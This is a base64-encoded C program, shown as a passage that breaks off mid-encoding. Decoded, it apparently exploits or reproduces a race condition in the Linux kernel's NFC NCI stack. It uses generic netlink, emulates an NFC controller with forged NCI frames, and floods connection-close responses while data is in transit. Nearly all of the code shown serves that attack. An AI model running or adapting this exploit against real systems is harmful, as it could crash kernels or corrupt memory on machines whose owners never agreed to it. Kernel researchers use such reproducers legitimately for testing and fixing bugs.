I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPGVycm5vLmg+CiNpbmNsdWRlIDxmY250bC5o
PgojaW5jbHVkZSA8bGludXgvZ2VuZXRsaW5rLmg+CiNpbmNsdWRlIDxsaW51eC9uZXRsaW5rLmg+
CiNpbmNsdWRlIDxsaW51eC9uZmMuaD4KI2luY2x1ZGUgPHBvbGwuaD4KI2luY2x1ZGUgPHB0aHJl
YWQuaD4KI2luY2x1ZGUgPHNjaGVkLmg+CiNpbmNsdWRlIDxzdGRpbnQuaD4KI2luY2x1ZGUgPHN0
ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8
c3lzL2lvY3RsLmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMu
aD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKI2lmbmRlZiBTT0xfTkVUTElOSwojZGVmaW5lIFNPTF9O
RVRMSU5LIDI3MAojZW5kaWYKI2lmbmRlZiBORVRMSU5LX0FERF9NRU1CRVJTSElQCiNkZWZpbmUg
TkVUTElOS19BRERfTUVNQkVSU0hJUCAxCiNlbmRpZgojaWZuZGVmIEdFTkxfSURfQ1RSTAojZGVm
aW5lIEdFTkxfSURfQ1RSTCBOTE1TR19NSU5fVFlQRQojZW5kaWYKI2lmbmRlZiBOTEFfQUxJR05U
TwojZGVmaW5lIE5MQV9BTElHTlRPIDQKI2VuZGlmCiNpZm5kZWYgTkxBX0FMSUdOCiNkZWZpbmUg
TkxBX0FMSUdOKGxlbikgKCgobGVuKSArIE5MQV9BTElHTlRPIC0gMSkgJiB+KE5MQV9BTElHTlRP
IC0gMSkpCiNlbmRpZgojaWZuZGVmIE5MQV9IRFJMRU4KI2RlZmluZSBOTEFfSERSTEVOICgoaW50
KU5MQV9BTElHTihzaXplb2Yoc3RydWN0IG5sYXR0cikpKQojZW5kaWYKCiNkZWZpbmUgSU9DVExf
R0VUX05DSURFVl9JRFggMAoKI2RlZmluZSBNQVhfTkxNU0cgODE5MgojZGVmaW5lIE1BWF9OQ0lf
RlJBTUUgNDA5NgojZGVmaW5lIFRYX1BBWUxPQURfTEVOIDQwOTYKI2RlZmluZSBBVFRFTVBUUyA1
MAoKI2RlZmluZSBOQ0lfTVRfREFUQV9QS1QgMHgwMAojZGVmaW5lIE5DSV9NVF9DTURfUEtUICAw
eDAxCiNkZWZpbmUgTkNJX01UX1JTUF9QS1QgIDB4MDIKI2RlZmluZSBOQ0lfTVRfTlRGX1BLVCAg
MHgwMwoKI2RlZmluZSBOQ0lfR0lEX0NPUkUgICAgMHgwMAojZGVmaW5lIE5DSV9HSURfUkZfTUdN
VCAweDAxCiNkZWZpbmUgTkNJX0dJRF9ORkNFRSAgIDB4MDIKCiNkZWZpbmUgTkNJX09JRF9DT1JF
X1JFU0VUICAgICAgICAweDAwCiNkZWZpbmUgTkNJX09JRF9DT1JFX0lOSVQgICAgICAgICAweDAx
CiNkZWZpbmUgTkNJX09JRF9DT1JFX1NFVF9DT05GSUcgICAweDAyCiNkZWZpbmUgTkNJX09JRF9D
T1JFX0NPTk5fQ0xPU0UgICAweDA1CiNkZWZpbmUgTkNJX09JRF9DT1JFX0NSRURJVFMgICAgICAw
eDA2CiNkZWZpbmUgTkNJX09JRF9SRl9ESVNDT1ZFUl9NQVAgICAweDAwCiNkZWZpbmUgTkNJX09J
RF9SRl9ESVNDT1ZFUiAgICAgICAweDAzCiNkZWZpbmUgTkNJX09JRF9SRl9ESVNDT1ZFUl9TRUwg
ICAweDA0CiNkZWZpbmUgTkNJX09JRF9SRl9JTlRGX0FDVElWQVRFRCAweDA1CiNkZWZpbmUgTkNJ
X09JRF9SRl9ERUFDVElWQVRFICAgICAweDA2CgojZGVmaW5lIE5DSV9TVEFUVVNfT0sgMHgwMAoK
I2RlZmluZSBOQ0lfUkZfUFJPVE9DT0xfTkZDX0RFUCAweDA1CiNkZWZpbmUgTkNJX1JGX0lOVEVS
RkFDRV9ORkNfREVQIDB4MDMKI2RlZmluZSBOQ0lfTkZDX0FfUEFTU0lWRV9QT0xMX01PREUgMHgw
MAojZGVmaW5lIE5DSV9CSVRfUkFURV8xMDYgMHgwMAojZGVmaW5lIE5DSV9EQVRBX0ZMT1dfQ09O
VFJPTF9OT1RfVVNFRCAweGZmCgpzdHJ1Y3QgbmZjX2dlbmwgewogICAgaW50IGZkOwogICAgdWlu
dDE2X3QgZmFtaWx5X2lkOwogICAgdWludDMyX3QgbWNhc3RfaWQ7CiAgICB1aW50MzJfdCBzZXE7
Cn07CgpzdHJ1Y3QgY3RybF9jdHggewogICAgaW50IGZkOwogICAgdm9sYXRpbGUgaW50IHN0b3A7
CiAgICB2b2xhdGlsZSBpbnQgYXJtX2Nsb3NlOwogICAgdm9sYXRpbGUgaW50IGRhdGFfdHhfc2Vl
bjsKICAgIHZvbGF0aWxlIGludCBjbG9zZV9pbmplY3RlZDsKfTsKCnN0YXRpYyB1aW50OF90IG5j
aV9oZHIodWludDhfdCBtdCwgdWludDhfdCBnaWQpCnsKICAgIHJldHVybiAodWludDhfdCkoKCht
dCAmIDcpIDw8IDUpIHwgKGdpZCAmIDB4MGYpKTsKfQoKc3RhdGljIHVpbnQ4X3QgbmNpX210KGNv
bnN0IHVpbnQ4X3QgKmZyYW1lKQp7CiAgICByZXR1cm4gKHVpbnQ4X3QpKChmcmFtZVswXSA+PiA1
KSAmIDcpOwp9CgpzdGF0aWMgdWludDhfdCBuY2lfZ2lkKGNvbnN0IHVpbnQ4X3QgKmZyYW1lKQp7
CiAgICByZXR1cm4gKHVpbnQ4X3QpKGZyYW1lWzBdICYgMHgwZik7Cn0KCnN0YXRpYyB1aW50OF90
IG5jaV9vaWQoY29uc3QgdWludDhfdCAqZnJhbWUpCnsKICAgIHJldHVybiAodWludDhfdCkoZnJh
bWVbMV0gJiAweDNmKTsKfQoKc3RhdGljIGludCB3cml0ZV9uY2lfZnJhbWUoaW50IGZkLCBjb25z
dCB2b2lkICpidWYsIHNpemVfdCBsZW4pCnsKICAgIHNzaXplX3QgbjsKCiAgICBkbyB7CiAgICAg
ICAgbiA9IHdyaXRlKGZkLCBidWYsIGxlbik7CiAgICB9IHdoaWxlIChuIDwgMCAmJiBlcnJubyA9
PSBFSU5UUik7CgogICAgaWYgKG4gIT0gKHNzaXplX3QpbGVuKSB7CiAgICAgICAgaWYgKG4gPj0g
MCkKICAgICAgICAgICAgZXJybm8gPSBFSU87CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAg
cmV0dXJuIDA7Cn0KCnN0YXRpYyB2b2lkIHNlbmRfc3RhdHVzX3JzcChpbnQgZmQsIHVpbnQ4X3Qg
Z2lkLCB1aW50OF90IG9pZCkKewogICAgdWludDhfdCByc3BbNV07CiAgICBzaXplX3QgbGVuID0g
NDsKCiAgICByc3BbMF0gPSBuY2lfaGRyKE5DSV9NVF9SU1BfUEtULCBnaWQpOwogICAgcnNwWzFd
ID0gb2lkOwogICAgcnNwWzJdID0gMTsKICAgIHJzcFszXSA9IE5DSV9TVEFUVVNfT0s7CgogICAg
aWYgKGdpZCA9PSBOQ0lfR0lEX0NPUkUgJiYgb2lkID09IE5DSV9PSURfQ09SRV9TRVRfQ09ORklH
KSB7CiAgICAgICAgcnNwWzJdID0gMjsKICAgICAgICByc3BbNF0gPSAwOwogICAgICAgIGxlbiA9
IDU7CiAgICB9IGVsc2UgaWYgKGdpZCA9PSBOQ0lfR0lEX05GQ0VFICYmIG9pZCA9PSAweDAwKSB7
CiAgICAgICAgcnNwWzJdID0gMjsKICAgICAgICByc3BbNF0gPSAwOwogICAgICAgIGxlbiA9IDU7
CiAgICB9CgogICAgKHZvaWQpd3JpdGVfbmNpX2ZyYW1lKGZkLCByc3AsIGxlbik7Cn0KCnN0YXRp
YyB2b2lkIHNlbmRfY29yZV9yZXNldF9yc3AoaW50IGZkKQp7CiAgICB1aW50OF90IHJzcFtdID0g
ewogICAgICAgIDB4NDAsIDB4MDAsIDB4MDMsCiAgICAgICAgTkNJX1NUQVRVU19PSywKICAgICAg
ICAweDEwLAogICAgICAgIDB4MDAsCiAgICB9OwoKICAgICh2b2lkKXdyaXRlX25jaV9mcmFtZShm
ZCwgcnNwLCBzaXplb2YocnNwKSk7Cn0KCnN0YXRpYyB2b2lkIHNlbmRfY29yZV9pbml0X3JzcChp
bnQgZmQpCnsKICAgIHVpbnQ4X3QgcnNwW10gPSB7CiAgICAgICAgMHg0MCwgMHgwMSwgMHgxMiwK
ICAgICAgICBOQ0lfU1RBVFVTX09LLAogICAgICAgIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsCiAg
ICAgICAgMHgwMSwKICAgICAgICBOQ0lfUkZfSU5URVJGQUNFX05GQ19ERVAsCiAgICAgICAgMHgw
NCwKICAgICAgICAweDAwLCAweDAwLAogICAgICAgIDB4ZmYsCiAgICAgICAgMHhmZiwgMHgwMCwK
ICAgICAgICAweDAwLAogICAgICAgIDB4MDAsIDB4MDAsIDB4MDAsIDB4MDAsCiAgICB9OwoKICAg
ICh2b2lkKXdyaXRlX25jaV9mcmFtZShmZCwgcnNwLCBzaXplb2YocnNwKSk7Cn0KCnN0YXRpYyB2
b2lkIHNlbmRfcmZfZGVhY3RpdmF0ZV9udGYoaW50IGZkKQp7CiAgICB1aW50OF90IG50ZltdID0g
ewogICAgICAgIDB4NjEsIE5DSV9PSURfUkZfREVBQ1RJVkFURSwgMHgwMiwKICAgICAgICAweDAw
LAogICAgICAgIDB4MDAsCiAgICB9OwoKICAgICh2b2lkKXdyaXRlX25jaV9mcmFtZShmZCwgbnRm
LCBzaXplb2YobnRmKSk7Cn0KCnN0YXRpYyB2b2lkIHNlbmRfY29ubl9jcmVkaXRzX250ZihpbnQg
ZmQpCnsKICAgIHVpbnQ4X3QgbnRmW10gPSB7CiAgICAgICAgMHg2MCwgTkNJX09JRF9DT1JFX0NS
RURJVFMsIDB4MDMsCiAgICAgICAgMHgwMSwKICAgICAgICAweDAwLAogICAgICAgIE5DSV9EQVRB
X0ZMT1dfQ09OVFJPTF9OT1RfVVNFRCwKICAgIH07CgogICAgKHZvaWQpd3JpdGVfbmNpX2ZyYW1l
KGZkLCBudGYsIHNpemVvZihudGYpKTsKfQoKc3RhdGljIHZvaWQgc2VuZF9jb25uX2Nsb3NlX3Jz
cChpbnQgZmQpCnsKICAgIHVpbnQ4X3QgcnNwW10gPSB7CiAgICAgICAgMHg0MCwgTkNJX09JRF9D
T1JFX0NPTk5fQ0xPU0UsIDB4MDEsCiAgICAgICAgTkNJX1NUQVRVU19PSywKICAgIH07CgogICAg
KHZvaWQpd3JpdGVfbmNpX2ZyYW1lKGZkLCByc3AsIHNpemVvZihyc3ApKTsKfQoKc3RhdGljIHZv
aWQgYmxhc3RfY29ubl9jbG9zZV9yc3AoaW50IGZkKQp7CiAgICBmb3IgKGludCBpID0gMDsgaSA8
IDY0OyBpKyspIHsKICAgICAgICBzZW5kX2Nvbm5fY2xvc2VfcnNwKGZkKTsKICAgICAgICBpZiAo
KGkgJiA3KSA9PSA3KQogICAgICAgICAgICBzY2hlZF95aWVsZCgpOwogICAgfQp9CgpzdGF0aWMg
dm9pZCBzZW5kX3JmX2ludGZfYWN0aXZhdGVkX250ZihpbnQgZmQpCnsKICAgIHVpbnQ4X3QgbnRm
W10gPSB7CiAgICAgICAgMHg2MSwgTkNJX09JRF9SRl9JTlRGX0FDVElWQVRFRCwgMHgxNCwKICAg
ICAgICAweDAxLAogICAgICAgIE5DSV9SRl9JTlRFUkZBQ0VfTkZDX0RFUCwKICAgICAgICBOQ0lf
UkZfUFJPVE9DT0xfTkZDX0RFUCwKICAgICAgICBOQ0lfTkZDX0FfUEFTU0lWRV9QT0xMX01PREUs
CiAgICAgICAgMHgwMSwKICAgICAgICBOQ0lfREFUQV9GTE9XX0NPTlRST0xfTk9UX1VTRUQsCiAg
ICAgICAgMHgwOSwKICAgICAgICAweDQ0LCAweDAwLAogICAgICAgIDB4MDQsCiAgICAgICAgMHhk
ZSwgMHhhZCwgMHhiZSwgMHhlZiwKICAgICAgICAweDAxLAogICAgICAgIDB4NDAsCiAgICAgICAg
TkNJX05GQ19BX1BBU1NJVkVfUE9MTF9NT0RFLAogICAgICAgIE5DSV9CSVRfUkFURV8xMDYsCiAg
ICAgICAgTkNJX0JJVF9SQVRFXzEwNiwKICAgICAgICAweDAwLAogICAgfTsKCiAgICAodm9pZCl3
cml0ZV9uY2lfZnJhbWUoZmQsIG50Ziwgc2l6ZW9mKG50ZikpOwp9CgpzdGF0aWMgdm9pZCBoYW5k
bGVfbmNpX2NtZChzdHJ1Y3QgY3RybF9jdHggKmN0eCwgY29uc3QgdWludDhfdCAqYnVmLCBzc2l6
ZV90IG4pCnsKICAgIHVpbnQ4X3QgZ2lkOwogICAgdWludDhfdCBvaWQ7CgogICAgaWYgKG4gPCAz
KQogICAgICAgIHJldHVybjsKCiAgICBnaWQgPSBuY2lfZ2lkKGJ1Zik7CiAgICBvaWQgPSBuY2lf
b2lkKGJ1Zik7CgogICAgaWYgKGdpZCA9PSBOQ0lfR0lEX0NPUkUpIHsKICAgICAgICBzd2l0Y2gg
KG9pZCkgewogICAgICAgIGNhc2UgTkNJX09JRF9DT1JFX1JFU0VUOgogICAgICAgICAgICBzZW5k
X2NvcmVfcmVzZXRfcnNwKGN0eC0+ZmQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgY2Fz
ZSBOQ0lfT0lEX0NPUkVfSU5JVDoKICAgICAgICAgICAgc2VuZF9jb3JlX2luaXRfcnNwKGN0eC0+
ZmQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgY2FzZSBOQ0lfT0lEX0NPUkVfU0VUX0NP
TkZJRzoKICAgICAgICAgICAgc2VuZF9zdGF0dXNfcnNwKGN0eC0+ZmQsIGdpZCwgb2lkKTsKICAg
ICAgICAgICAgcmV0dXJuOwogICAgICAgIGNhc2UgTkNJX09JRF9DT1JFX0NPTk5fQ0xPU0U6CiAg
ICAgICAgICAgIHNlbmRfY29ubl9jbG9zZV9yc3AoY3R4LT5mZCk7CiAgICAgICAgICAgIHJldHVy
bjsKICAgICAgICBkZWZhdWx0OgogICAgICAgICAgICBzZW5kX3N0YXR1c19yc3AoY3R4LT5mZCwg
Z2lkLCBvaWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgfQoKICAgIGlmIChn
aWQgPT0gTkNJX0dJRF9SRl9NR01UKSB7CiAgICAgICAgc3dpdGNoIChvaWQpIHsKICAgICAgICBj
YXNlIE5DSV9PSURfUkZfRElTQ09WRVJfTUFQOgogICAgICAgIGNhc2UgTkNJX09JRF9SRl9ESVND
T1ZFUjoKICAgICAgICAgICAgc2VuZF9zdGF0dXNfcnNwKGN0eC0+ZmQsIGdpZCwgb2lkKTsKICAg
ICAgICAgICAgcmV0dXJuOwogICAgICAgIGNhc2UgTkNJX09JRF9SRl9ESVNDT1ZFUl9TRUw6CiAg
ICAgICAgICAgIHNlbmRfc3RhdHVzX3JzcChjdHgtPmZkLCBnaWQsIG9pZCk7CiAgICAgICAgICAg
IHNlbmRfcmZfaW50Zl9hY3RpdmF0ZWRfbnRmKGN0eC0+ZmQpOwogICAgICAgICAgICByZXR1cm47
CiAgICAgICAgY2FzZSBOQ0lfT0lEX1JGX0RFQUNUSVZBVEU6CiAgICAgICAgICAgIHNlbmRfc3Rh
dHVzX3JzcChjdHgtPmZkLCBnaWQsIG9pZCk7CiAgICAgICAgICAgIHNlbmRfcmZfZGVhY3RpdmF0
ZV9udGYoY3R4LT5mZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICBkZWZhdWx0OgogICAg
ICAgICAgICBzZW5kX3N0YXR1c19yc3AoY3R4LT5mZCwgZ2lkLCBvaWQpOwogICAgICAgICAgICBy
ZXR1cm47CiAgICAgICAgfQogICAgfQoKICAgIHNlbmRfc3RhdHVzX3JzcChjdHgtPmZkLCBnaWQs
IG9pZCk7Cn0KCnN0YXRpYyB2b2lkICpjb250cm9sbGVyX3RocmVhZCh2b2lkICphcmcpCnsKICAg
IHN0cnVjdCBjdHJsX2N0eCAqY3R4ID0gYXJnOwogICAgdWludDhfdCBidWZbTUFYX05DSV9GUkFN
RV07CgogICAgd2hpbGUgKCFfX2F0b21pY19sb2FkX24oJmN0eC0+c3RvcCwgX19BVE9NSUNfUkVM
QVhFRCkpIHsKICAgICAgICBzdHJ1Y3QgcG9sbGZkIHBmZCA9IHsgLmZkID0gY3R4LT5mZCwgLmV2
ZW50cyA9IFBPTExJTiB9OwogICAgICAgIGludCBwciA9IHBvbGwoJnBmZCwgMSwgMTApOwoKICAg
ICAgICBpZiAocHIgPCAwKSB7CiAgICAgICAgICAgIGlmIChlcnJubyA9PSBFSU5UUikKICAgICAg
ICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAg
aWYgKHByID09IDAgfHwgIShwZmQucmV2ZW50cyAmIFBPTExJTikpCiAgICAgICAgICAgIGNvbnRp
bnVlOwoKICAgICAgICBzc2l6ZV90IG4gPSByZWFkKGN0eC0+ZmQsIGJ1Ziwgc2l6ZW9mKGJ1Zikp
OwogICAgICAgIGlmIChuIDwgMCkgewogICAgICAgICAgICBpZiAoZXJybm8gPT0gRUlOVFIgfHwg
ZXJybm8gPT0gRUFHQUlOKQogICAgICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgICAgIGJy
ZWFrOwogICAgICAgIH0KICAgICAgICBpZiAobiA8IDMpCiAgICAgICAgICAgIGNvbnRpbnVlOwoK
ICAgICAgICBpZiAobmNpX210KGJ1ZikgPT0gTkNJX01UX0NNRF9QS1QpIHsKICAgICAgICAgICAg
aGFuZGxlX25jaV9jbWQoY3R4LCBidWYsIG4pOwogICAgICAgIH0gZWxzZSBpZiAobmNpX210KGJ1
ZikgPT0gTkNJX01UX0RBVEFfUEtUKSB7CiAgICAgICAgICAgIGludCBzZWVuID0gX19hdG9taWNf
YWRkX2ZldGNoKCZjdHgtPmRhdGFfdHhfc2VlbiwgMSwKICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgX19BVE9NSUNfUkVMQVhFRCk7CgogICAgICAgICAgICBpZiAoX19h
dG9taWNfbG9hZF9uKCZjdHgtPmFybV9jbG9zZSwgX19BVE9NSUNfUkVMQVhFRCkgJiYKICAgICAg
ICAgICAgICAgICFfX2F0b21pY19leGNoYW5nZV9uKCZjdHgtPmNsb3NlX2luamVjdGVkLCAxLAog
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19BVE9NSUNfUkVMQVhFRCkpIHsK
ICAgICAgICAgICAgICAgIGJsYXN0X2Nvbm5fY2xvc2VfcnNwKGN0eC0+ZmQpOwogICAgICAgICAg
ICB9IGVsc2UgaWYgKChzZWVuICYgMHgzZikgPT0gMCkgewogICAgICAgICAgICAgICAgc2VuZF9j
b25uX2NyZWRpdHNfbnRmKGN0eC0+ZmQpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoK
ICAgIHJldHVybiBOVUxMOwp9CgpzdGF0aWMgaW50IGFkZGF0dHJfbChzdHJ1Y3Qgbmxtc2doZHIg
Km5saCwgc2l6ZV90IG1heGxlbiwgaW50IHR5cGUsCiAgICAgICAgICAgICAgICAgICAgIGNvbnN0
IHZvaWQgKmRhdGEsIHNpemVfdCBhbGVuKQp7CiAgICBzaXplX3QgbGVuID0gTkxBX0hEUkxFTiAr
IGFsZW47CiAgICBzaXplX3QgbmV3bGVuID0gTkxNU0dfQUxJR04obmxoLT5ubG1zZ19sZW4pICsg
TkxBX0FMSUdOKGxlbik7CiAgICBzdHJ1Y3QgbmxhdHRyICpubGE7CgogICAgaWYgKG5ld2xlbiA+
IG1heGxlbikgewogICAgICAgIGVycm5vID0gRU1TR1NJWkU7CiAgICAgICAgcmV0dXJuIC0xOwog
ICAgfQoKICAgIG5sYSA9IChzdHJ1Y3QgbmxhdHRyICopKChjaGFyICopbmxoICsgTkxNU0dfQUxJ
R04obmxoLT5ubG1zZ19sZW4pKTsKICAgIG5sYS0+bmxhX3R5cGUgPSB0eXBlOwogICAgbmxhLT5u
bGFfbGVuID0gKHVpbnQxNl90KWxlbjsKICAgIGlmIChhbGVuKQogICAgICAgIG1lbWNweSgoY2hh
ciAqKW5sYSArIE5MQV9IRFJMRU4sIGRhdGEsIGFsZW4pOwogICAgbWVtc2V0KChjaGFyICopbmxh
ICsgbGVuLCAwLCBOTEFfQUxJR04obGVuKSAtIGxlbik7CiAgICBubGgtPm5sbXNnX2xlbiA9ICh1
aW50MzJfdCluZXdsZW47CiAgICByZXR1cm4gMDsKfQoKc3RhdGljIGludCBhZGRhdHRyX3UzMihz
dHJ1Y3Qgbmxtc2doZHIgKm5saCwgc2l6ZV90IG1heGxlbiwgaW50IHR5cGUsCiAgICAgICAgICAg
ICAgICAgICAgICAgdWludDMyX3QgdmFsdWUpCnsKICAgIHJldHVybiBhZGRhdHRyX2wobmxoLCBt
YXhsZW4sIHR5cGUsICZ2YWx1ZSwgc2l6ZW9mKHZhbHVlKSk7Cn0KCnN0YXRpYyBpbnQgYWRkYXR0
cl91OChzdHJ1Y3Qgbmxtc2doZHIgKm5saCwgc2l6ZV90IG1heGxlbiwgaW50IHR5cGUsCiAgICAg
ICAgICAgICAgICAgICAgICB1aW50OF90IHZhbHVlKQp7CiAgICByZXR1cm4gYWRkYXR0cl9sKG5s
aCwgbWF4bGVuLCB0eXBlLCAmdmFsdWUsIHNpemVvZih2YWx1ZSkpOwp9CgpzdGF0aWMgaW50IGFk
ZGF0dHJfc3RyeihzdHJ1Y3Qgbmxtc2doZHIgKm5saCwgc2l6ZV90IG1heGxlbiwgaW50IHR5cGUs
CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNoYXIgKnZhbHVlKQp7CiAgICByZXR1cm4g
YWRkYXR0cl9sKG5saCwgbWF4bGVuLCB0eXBlLCB2YWx1ZSwgc3RybGVuKHZhbHVlKSArIDEpOwp9
CgpzdGF0aWMgaW50IHBhcnNlX2F0dHJzKHN0cnVjdCBubGF0dHIgKip0YiwgaW50IG1heGF0dHIs
IHN0cnVjdCBubGF0dHIgKmF0dHIsCiAgICAgICAgICAgICAgICAgICAgICAgaW50IGxlbikKewog
ICAgbWVtc2V0KHRiLCAwLCBzaXplb2Yoc3RydWN0IG5sYXR0ciAqKSAqIChtYXhhdHRyICsgMSkp
OwoKICAgIHdoaWxlIChsZW4gPj0gKGludClzaXplb2YoKmF0dHIpICYmIGF0dHItPm5sYV9sZW4g
Pj0gc2l6ZW9mKCphdHRyKSAmJgogICAgICAgICAgIGF0dHItPm5sYV9sZW4gPD0gbGVuKSB7CiAg
ICAgICAgaW50IHR5cGUgPSBhdHRyLT5ubGFfdHlwZSAmIE5MQV9UWVBFX01BU0s7CiAgICAgICAg
aWYgKHR5cGUgPD0gbWF4YXR0cikKICAgICAgICAgICAgdGJbdHlwZV0gPSBhdHRyOwogICAgICAg
IGxlbiAtPSBOTEFfQUxJR04oYXR0ci0+bmxhX2xlbik7CiAgICAgICAgYXR0ciA9IChzdHJ1Y3Qg
bmxhdHRyICopKChjaGFyICopYXR0ciArIE5MQV9BTElHTihhdHRyLT5ubGFfbGVuKSk7CiAgICB9
CgogICAgcmV0dXJuIGxlbiA9PSAwID8gMCA6IC0xOwp9CgpzdGF0aWMgdWludDMyX3QgbmxhX2dl
dF91MzJfbG9jYWwoY29uc3Qgc3RydWN0IG5sYXR0ciAqbmxhKQp7CiAgICB1aW50MzJfdCB2Owog
ICAgbWVtY3B5KCZ2LCAoY29uc3QgY2hhciAqKW5sYSArIE5MQV9IRFJMRU4sIHNpemVvZih2KSk7
CiAgICByZXR1cm4gdjsKfQoKc3RhdGljIHVpbnQxNl90IG5sYV9nZXRfdTE2X2xvY2FsKGNvbnN0
IHN0cnVjdCBubGF0dHIgKm5sYSkKewogICAgdWludDE2X3QgdjsKICAgIG1lbWNweSgmdiwgKGNv
bnN0IGNoYXIgKilubGEgKyBOTEFfSERSTEVOLCBzaXplb2YodikpOwogICAgcmV0dXJuIHY7Cn0K
CnN0YXRpYyBjaGFyICpubGFfZGF0YV9sb2NhbChjb25zdCBzdHJ1Y3QgbmxhdHRyICpubGEpCnsK
ICAgIHJldHVybiAoY2hhciAqKW5sYSArIE5MQV9IRFJMRU47Cn0KCnN0YXRpYyBpbnQgcmVjdl9h
Y2soaW50IGZkLCB1aW50MzJfdCBzZXEpCnsKICAgIGNoYXIgYnVmW01BWF9OTE1TR107CgogICAg
Zm9yICg7OykgewogICAgICAgIHNzaXplX3QgbiA9IHJlY3YoZmQsIGJ1Ziwgc2l6ZW9mKGJ1Ziks
IDApOwogICAgICAgIGlmIChuIDwgMCkgewogICAgICAgICAgICBpZiAoZXJybm8gPT0gRUlOVFIp
CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAg
IH0KCiAgICAgICAgZm9yIChzdHJ1Y3Qgbmxtc2doZHIgKm5saCA9IChzdHJ1Y3Qgbmxtc2doZHIg
KilidWY7CiAgICAgICAgICAgICBOTE1TR19PSyhubGgsICh1bnNpZ25lZCBpbnQpbik7CiAgICAg
ICAgICAgICBubGggPSBOTE1TR19ORVhUKG5saCwgbikpIHsKICAgICAgICAgICAgaWYgKG5saC0+
bmxtc2dfc2VxICE9IHNlcSkKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICBp
ZiAobmxoLT5ubG1zZ190eXBlID09IE5MTVNHX0VSUk9SKSB7CiAgICAgICAgICAgICAgICBzdHJ1
Y3Qgbmxtc2dlcnIgKmVyciA9IE5MTVNHX0RBVEEobmxoKTsKICAgICAgICAgICAgICAgIGlmIChl
cnItPmVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgZXJybm8gPSAtZXJyLT5lcnJvcjsKICAg
ICAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAg
ICAgICByZXR1cm4gMDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKc3RhdGljIGlu
dCByZXNvbHZlX25mY19mYW1pbHkoc3RydWN0IG5mY19nZW5sICpnZW5sKQp7CiAgICBjaGFyIHJl
cVtNQVhfTkxNU0ddOwogICAgY2hhciByZXNwW01BWF9OTE1TR107CiAgICBzdHJ1Y3Qgbmxtc2do
ZHIgKm5saCA9IChzdHJ1Y3Qgbmxtc2doZHIgKilyZXE7CiAgICBzdHJ1Y3QgZ2VubG1zZ2hkciAq
Z2hkcjsKICAgIHVpbnQzMl90IHNlcSA9ICsrZ2VubC0+c2VxOwoKICAgIG1lbXNldChyZXEsIDAs
IHNpemVvZihyZXEpKTsKICAgIG5saC0+bmxtc2dfbGVuID0gTkxNU0dfTEVOR1RIKEdFTkxfSERS
TEVOKTsKICAgIG5saC0+bmxtc2dfdHlwZSA9IEdFTkxfSURfQ1RSTDsKICAgIG5saC0+bmxtc2df
ZmxhZ3MgPSBOTE1fRl9SRVFVRVNUOwogICAgbmxoLT5ubG1zZ19zZXEgPSBzZXE7CiAgICBnaGRy
ID0gTkxNU0dfREFUQShubGgpOwogICAgZ2hkci0+Y21kID0gQ1RSTF9DTURfR0VURkFNSUxZOwog
ICAgZ2hkci0+dmVyc2lvbiA9IDE7CgogICAgaWYgKGFkZGF0dHJfc3RyeihubGgsIHNpemVvZihy
ZXEpLCBDVFJMX0FUVFJfRkFNSUxZX05BTUUsIE5GQ19HRU5MX05BTUUpKQogICAgICAgIHJldHVy
biAtMTsKICAgIGlmIChzZW5kKGdlbmwtPmZkLCByZXEsIG5saC0+bmxtc2dfbGVuLCAwKSA8IDAp
CiAgICAgICAgcmV0dXJuIC0xOwoKICAgIGZvciAoOzspIHsKICAgICAgICBzc2l6ZV90IG4gPSBy
ZWN2KGdlbmwtPmZkLCByZXNwLCBzaXplb2YocmVzcCksIDApOwogICAgICAgIGlmIChuIDwgMCkg
ewogICAgICAgICAgICBpZiAoZXJybm8gPT0gRUlOVFIpCiAgICAgICAgICAgICAgICBjb250aW51
ZTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KCiAgICAgICAgZm9yIChubGggPSAo
c3RydWN0IG5sbXNnaGRyICopcmVzcDsgTkxNU0dfT0sobmxoLCAodW5zaWduZWQgaW50KW4pOwog
ICAgICAgICAgICAgbmxoID0gTkxNU0dfTkVYVChubGgsIG4pKSB7CiAgICAgICAgICAgIHN0cnVj
dCBubGF0dHIgKnRiW0NUUkxfQVRUUl9NQVggKyAxXTsKICAgICAgICAgICAgaW50IGF0dHJsZW47
CgogICAgICAgICAgICBpZiAobmxoLT5ubG1zZ19zZXEgIT0gc2VxKQogICAgICAgICAgICAgICAg
Y29udGludWU7CiAgICAgICAgICAgIGlmIChubGgtPm5sbXNnX3R5cGUgPT0gTkxNU0dfRVJST1Ip
IHsKICAgICAgICAgICAgICAgIHN0cnVjdCBubG1zZ2VyciAqZXJyID0gTkxNU0dfREFUQShubGgp
OwogICAgICAgICAgICAgICAgZXJybm8gPSBlcnItPmVycm9yID8gLWVyci0+ZXJyb3IgOiBFUFJP
VE87CiAgICAgICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAg
IGdoZHIgPSBOTE1TR19EQVRBKG5saCk7CiAgICAgICAgICAgIGF0dHJsZW4gPSAoaW50KW5saC0+
